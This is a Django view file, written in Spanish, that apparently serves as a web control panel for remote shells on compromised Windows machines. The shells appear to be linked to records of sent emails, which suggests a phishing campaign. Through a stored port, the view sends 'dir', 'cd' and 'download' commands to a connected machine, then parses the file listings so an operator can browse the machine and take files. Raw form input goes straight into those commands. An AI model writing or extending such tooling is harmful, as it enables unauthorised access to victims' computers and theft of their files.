
from .connection_manager import ConnectionManager
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages 
from django.shortcuts import get_object_or_404
from backend.accesos.models import Accesos
from backend.smtp.models import Enviados
import re


connection_manager = ConnectionManager()


@login_required(login_url='/accounts/login/')
def index(request, id=None):
    data_list = []
    current_path = ""
    output = ""

    if id:
        enviado = get_object_or_404(Enviados, id=id)
        acceso = get_object_or_404(Accesos, enviado=enviado)
        puerto = acceso.puerto
        if puerto not in connection_manager.connections:
            connection_manager.start_connection(puerto)

        connection_manager.send_command(puerto, 'dir') 
        output = connection_manager.receive_output(puerto)

        if request.method == 'POST':
            if request.POST['instruccion'] == 'acceso-atras':
                connection_manager.send_command(puerto, 'cd ..')
            elif request.POST['instruccion'] == 'acceso-directorio':
                directory = request.POST.get('directorio')
                connection_manager.send_command(puerto, f'cd {directory}')
            elif request.POST['instruccion'] == 'acceso-descarga':
                file = request.POST.get('file')
                connection_manager.send_command(puerto, f'download {file}')
            else:
                messages.add_message(request, messages.ERROR, 'Error en la petición')
            
            # Después de cada comando de cambio de directorio, envía un nuevo comando 'dir' y lee su salida
            connection_manager.send_command(puerto, 'dir') 
            output = connection_manager.receive_output(puerto)

        # Patrones de expresiones regulares para identificar directorios y archivos
        dir_pattern = re.compile(r'<DIR>\s+([^\r\n]+)')
        file_pattern = re.compile(r'\d+/\d+/\d+\s+\d+:\d+\s+([^\r\n]+)')
        path_pattern = re.compile(r'(\w:\\[^\r\n]+)>')

        lines = output.split("\n")
        for line in lines:
            dir_match = dir_pattern.search(line)
            file_match = file_pattern.search(line)
            path_match = path_pattern.search(line)
            
            if dir_match:
                data_list.append([dir_match.group(1), 'dir'])
            elif file_match:
                data_list.append([file_match.group(1).split()[-1], 'file'])
            elif path_match:
                current_path = path_match.group(1)

    return render(request, 'backend/acceso/index.html', {'directorios': data_list, 'enviado': id, 'ruta': current_path})




